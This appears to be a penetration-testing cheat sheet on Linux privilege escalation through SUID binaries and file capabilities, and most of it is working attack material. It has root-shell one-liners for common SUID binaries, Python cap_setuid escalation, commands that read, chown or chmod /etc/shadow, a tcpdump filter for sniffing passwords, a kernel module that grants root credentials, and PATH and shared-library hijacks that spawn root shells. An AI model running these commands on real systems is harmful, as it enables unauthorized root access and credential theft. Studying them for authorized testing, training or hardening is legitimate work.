# SUID, SGID, and file capabilities

## Discovery
```bash
id
find / -xdev -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
find / -xdev -type f -perm -2000 -exec ls -l {} \; 2>/dev/null
getcap -r /usr /opt /home 2>/dev/null
```
- `-xdev` skips other mounts. `getcap` missing from PATH: try `/usr/sbin/getcap`. No output ≠ no capabilities.

Validate a candidate:
```bash
candidate=<PATH>
resolved=$(readlink -f -- "$candidate")
stat -Lc '%A %a %U:%G %n' -- "$candidate"
file -- "$resolved"
namei -l -- "$resolved"
getcap -n "$resolved"
findmnt -T "$resolved" -o TARGET,FSTYPE,OPTIONS
grep -E '^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' /proc/$$/status
```
- Look up the binary on GTFOBins under the SUID or Capabilities context, not Sudo.

## SUID one-liners (offline)
Owner must be root; confirm with `ls -l` first. Look up anything missing from this list on GTFOBins under its SUID context.

| Binary | Shell |
| --- | --- |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `bash` | `bash -p` |
| `env` | `env /bin/sh -p` |
| `python3` | `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `vi` / `vim` | `vi -c ':set shell=/bin/sh\ -p | shell'` |
| `php` | `php -r 'pcntl_exec("/bin/sh", ["-p"]);'` |
| `nmap` (2.02–5.21) | `nmap --interactive`, then `!sh` |
| `systemctl` | unit-file trick, same as [sudo](sudo.md#common-sudo--gtfobins-one-liners-offline) minus `sudo -u` |
| `cp` / `base64` / `xxd` / `dd` | file read/write as root (no `-p` needed, no shell) |
| `pkexec` | not a GTFOBins SUID entry: it's itself setuid root by design → [PwnKit](kernel-checks.md#known-cve-patterns) |

- `perl` has no SUID shell in GTFOBins (only a `CAP_SETUID` capability path, below): don't expect `perl -e 'exec "/bin/sh"'` to keep root from a bare SUID bit.
- Pager/editor rows need a real TTY: [stabilize the shell](../foothold/shells.md#stabilize-a-linux-tty) first.

## What changes
| Mechanism | Effect |
| --- | --- |
| SUID | Effective UID = file owner (not necessarily root) |
| SGID | Effective GID = file group |
| File capability | Specific kernel privileges only |
| Child shell | May drop the effective ID: bash `-p` keeps it |

- SUID/SGID on scripts is ignored by Linux.
- `nosuid` mount, `NoNewPrivs: 1` or tracing suppress SUID/SGID/caps.
- Do not diagnose with `strace`/debugger: tracing changes the transition.

## Root-owned SUID bash
```bash
id
stat -Lc '%A %a %U:%G %n' <PATH>
findmnt -T <PATH> -o TARGET,FSTYPE,OPTIONS
<PATH> --noprofile --norc -p -c 'printf "real UID=%s effective UID=%s\n" "$UID" "$EUID"; /usr/bin/id'
<PATH> -p
```
- Expect `real UID=1000 effective UID=0` and `euid=0(root)`; the real UID stays unchanged.
- Still your user: re-check file, owner, mount flags, `NoNewPrivs`.

## Python with `cap_setuid`
Needs `cap_setuid=ep` (also shown as `+ep`) on the resolved binary.

```bash
id
getcap -n <PATH>
findmnt -T <PATH> -o TARGET,FSTYPE,OPTIONS
<PATH> -c 'import os; print("before:", os.getuid(), os.geteuid(), flush=True); os.setuid(0); print("after:", os.getuid(), os.geteuid(), flush=True); os.execl("/usr/bin/id", "id")'
<PATH> -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
```
- `Operation not permitted`: check effective/bounding sets, `nosuid`, `no_new_privs`, userns UID mapping.
- Only `p` (not `e`): the interpreter must enable it first, this one-liner assumes `ep`.

## Capability → use
| Capability | Use |
| --- | --- |
| `CAP_SETUID` | Change UID (above) |
| `CAP_SETGID` | Change GID / supplementary groups; check group-owned files/services |
| `CAP_DAC_READ_SEARCH` | Read any file, traverse directories (no write) |
| `CAP_DAC_OVERRIDE` | Bypass read/write permission checks |
| `CAP_SYS_PTRACE` | Inspect/control processes (namespace and policy permitting) |
| `CAP_SYS_ADMIN` | Broad, namespace-dependent: check the operation and container context |
| `CAP_CHOWN` | Reassign any file to yourself, ignoring the current owner |
| `CAP_FOWNER` | Bypass owner-only checks (`chmod`, `chown` target, `unlink`) on files you don't own |
| `CAP_NET_RAW` | Raw sockets: sniff with a binary that holds it |
| `CAP_SYS_MODULE` | Load a kernel module: arbitrary kernel-mode code |

- The capability lives in the process that holds it: a spawned `cat` child does not inherit it.

## Read with cap_dac_read_search
Bypasses the read/traverse permission check in the kernel; the file's own mode stops mattering.
```bash
tar cf /tmp/out.tar --absolute-names /etc/shadow
tar xf /tmp/out.tar -O
python3 -c 'print(open("/etc/shadow").read())'
```
- Not a GTFOBins-catalogued context for `tar`; this is the standard DAC_READ_SEARCH bypass, confirmed against GNU tar's own `--absolute-names` option.

## cap_net_raw
```bash
tcpdump -i any -A -nn | grep -iE 'user|pass|login'
```
- Needs an interface you can see traffic on; a container's own veth sees little.

## cap_chown / cap_fowner
```bash
chown $(id -un) /etc/shadow
chmod 666 /etc/shadow
```
Edit the file directly once you own it or it's world-writable: [readable secrets](misc-vectors.md#readable-secrets) for the passwd-line format.

## cap_sys_module
Only when `/lib/modules/$(uname -r)/build` exists (matching kernel headers).
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
MODULE_LICENSE("GPL");
int init_module(void) { commit_creds(prepare_kernel_cred(0)); return 0; }
void cleanup_module(void) {}
```
```bash
echo 'obj-m += pwn.o' > Makefile
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod ./pwn.ko
```

## Misleading leads
| Finding | Meaning |
| --- | --- |
| SUID on a script | Ignored: find the interpreter/caller |
| SUID owner is another user | You get that user, not root |
| SUID utility runs but child is unprivileged | Utility or shell dropped effective IDs |
| `NoNewPrivs: 1` / `nosuid` | File-derived privilege suppressed |
| Capability but action denied | Effective/bounding sets, namespace, MAC |
| UID 0 inside a container | Root there, not on host |
| Nothing found | Check other mounts, unreadable dirs, missing getcap |

## Custom binaries / shared libraries
- Inspect `file`, `strings`, called executables, config paths; writable helpers/parents → [root-run](root-run.md).
```bash
readelf -d <PATH>
```
- Shows NEEDED libraries and RPATH/RUNPATH: check whether that location is writable.
- `LD_LIBRARY_PATH`/`LD_PRELOAD` do not work for ordinary SUID execution.
- A copied or rewritten privileged file can lose its mode or capability xattr.

## Custom SUID: PATH and missing library
Inspect a copy, not the live file:

```bash
cp <PATH> /tmp/x
strings /tmp/x | less
ltrace /tmp/x 2>&1 | head -40
ldd /tmp/x
LD_DEBUG=libs /tmp/x 2>&1 | grep -i 'error\|not found\|trying'
```
- `strings` showing `service apache2 start`, `cat file`, `ps` … without a full path = relative command.
- `strace`/`ltrace` on the real SUID file run unprivileged (setuid ignored); on a copy they only list lookups: use them to find names, not to test escalation.

Relative command:
```bash
printf '%s\n' '#!/bin/sh' '/bin/bash -p' > /tmp/<COMMAND>
chmod +x /tmp/<COMMAND>
PATH=/tmp:$PATH <PATH>
```
Missing or writable-path shared library (`ldd`/`readelf -d` show `not found` or an RPATH you can write):

```c
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() { setuid(0); setgid(0); system("/bin/bash -p"); }
```
```bash
gcc -shared -fPIC -o <WRITABLE-DIR>/<LIBNAME>.so exp.c
<PATH>
```
- Binary must call `setuid(0)` itself or be root-owned SUID; `bash -p` keeps the effective ID.
- Common offenders: `/usr/local/bin/*` helpers, backup/status tools, copies of `vim`/`find` in odd places.
